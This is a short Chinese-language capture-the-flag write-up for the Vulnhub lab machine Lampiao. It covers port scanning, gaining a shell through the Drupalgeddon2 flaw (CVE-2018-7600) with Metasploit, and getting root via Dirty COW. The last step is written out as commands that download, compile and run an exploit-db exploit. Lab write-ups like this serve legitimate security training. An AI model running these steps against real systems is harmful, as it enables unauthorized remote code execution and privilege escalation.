---
title: Vulnhub - Lampiao の Write-Up
date: 2020-01-14 20:28:20
categories:
- WriteUPs
- Vulnhub
tags:
- Web
---
## 前言

今天尝试了下[Lampiao](https://www.vulnhub.com/entry/lampiao-1,249/)靶机，这是一台很简单的靶机，没有任何难度。

<!-- more -->

## Step 1

老套路，找靶机IP然后扫描端口：

![](/img/Lampiao/Lampiao1.png)

![](/img/Lampiao/Lampiao2.png)

22，80，1898这三个端口一目了然，主要的注意力肯定在这个Drupal 7服务上。

## Step 2

80端口简单看一下：

![](/img/Lampiao/Lampiao3.png)

就是个幌子，分散注意力的，什么有用的都没有。直接聚焦到1898端口：

![](/img/Lampiao/Lampiao4.png)

关于Drupal服务，其实很熟悉，在[DC-1](https://coldwave96.github.io/2019/11/14/DC-1)这台靶机中就接触过了。在MSF中查找这个漏洞的利用模块，一个一个尝试，很快我们就得到了目标机器的emterpreter。

![](/img/Lampiao/Lampiao5.png)

回过头我们再去了解一下这个漏洞，这是[Drupalgeddon-2漏洞](https://xz.aliyun.com/t/2271)，CVE编号CVE-2018-7600，对于默认或常见的Drupal安装来说，该漏洞允许攻击者在未经身份验证的情况下远程执行代码。

## Step 3

得到的是低权限的shell，下一步当然就是提权了，通过查看靶机内核，发现这是一台ubuntu 14.04的机器，并且其存在[脏牛漏洞](https://www.freebuf.com/vuls/117331.html)。

通过脏牛漏洞提权即可获得root权限，flag.txt就在root根目录下：

```bash
$ wget https://www.exploit-db.com/download/40847.cpp
$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
$ ./dcow -s
```

![](/img/Lampiao/Lampiao6.png)
